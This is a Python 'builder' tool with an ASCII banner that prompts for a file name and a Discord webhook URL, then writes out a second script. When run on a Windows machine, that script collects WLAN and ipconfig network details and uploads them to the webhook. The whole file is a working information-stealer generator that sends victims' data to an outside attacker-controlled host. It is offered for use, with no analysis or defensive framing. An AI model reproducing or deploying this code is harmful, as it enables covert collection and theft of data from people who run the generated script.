import subprocess
import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def print_header():
    header = f"""
{Fore.MAGENTA}▄███████▄       ▀█████████▄  ███    █▄   ▄█   ▄█       ████████▄  
{Fore.MAGENTA}██▀     ▄██        ███    ███ ███    ███ ███  ███       ███   ▀███ 
{Fore.MAGENTA}      ▄███▀        ███    ███ ███    ███ ███▌ ███       ███    ███ 
{Fore.MAGENTA} ▀█▀▄███▀▄▄       ▄███▄▄▄██▀  ███    ███ ███▌ ███       ███    ███ 
{Fore.MAGENTA}  ▄███▀   ▀      ▀▀███▀▀▀██▄  ███    ███ ███▌ ███       ███    ███ 
{Fore.MAGENTA}▄███▀              ███    ██▄ ███    ███ ███  ███       ███    ███ 
{Fore.MAGENTA}███▄     ▄█        ███    ███ ███    ███ ███  ███▌    ▄ ███   ▄███ 
{Fore.MAGENTA} ▀████████▀      ▄█████████▀  ████████▀  █▀   █████▄▄██ ████████▀  (zbuild)
{Fore.MAGENTA}                                              ▀                    
"""
    print(header)

def create_python_script(script_name, webhook_url):
    script_content = f"""import subprocess
import requests

def collect_info():
    info = {{}}

    # WLAN Information
    try:
        wlan_info = subprocess.check_output(["netsh", "wlan", "show", "interfaces"], text=False)
        info['WLAN Information'] = wlan_info.decode('cp1252', errors='replace')
    except subprocess.CalledProcessError as e:
        info['WLAN Information'] = f"Error collecting WLAN info: {{e}}"

    # IP Addresses and Network Information
    try:
        network_info = subprocess.check_output(["ipconfig", "/all"], text=False)
        info['Network Information'] = network_info.decode('cp1252', errors='replace')
    except subprocess.CalledProcessError as e:
        info['Network Information'] = f"Error collecting Network info: {{e}}"

    return info

def send_data_to_webhook():
    webhook_url = "{webhook_url}"
    info = collect_info()
    
    # Save collected information to a file
    with open("log.txt", "w", encoding='utf-8') as log_file:
        for section, content in info.items():
            log_file.write(f"\\n================== {{section}} ==================\\n")
            log_file.write(content)
    
    # Send the file to the webhook
    with open("log.txt", "rb") as file:
        files = {{
            "file": ("log.txt", file)
        }}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            print("Data successfully sent to webhook.")
        else:
            print(f"Failed to send data: {{response.status_code}}")

if __name__ == "__main__":
    send_data_to_webhook()
"""

    # Write the Python script to a file
    with open(script_name, "w") as script_file:
        script_file.write(script_content)

def main():
    print_header()

    script_name = input(f"{Fore.CYAN}Enter name to generate the Python script file (e.g., my_script.py): {Style.RESET_ALL}")
    webhook_url = input(f"{Fore.CYAN}Enter Discord Webhook URL: {Style.RESET_ALL}")

    if not script_name:
        print(f"{Fore.RED}No name entered.{Style.RESET_ALL}")
        return

    if not webhook_url:
        print(f"{Fore.RED}No Webhook URL entered.{Style.RESET_ALL}")
        return

    create_python_script(script_name, webhook_url)
    print(f"{Fore.GREEN}Python script '{script_name}' generated.{Style.RESET_ALL}")
    print(f"{Fore.GREEN}When the generated script is executed, it will collect data and send it to the specified Discord webhook.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
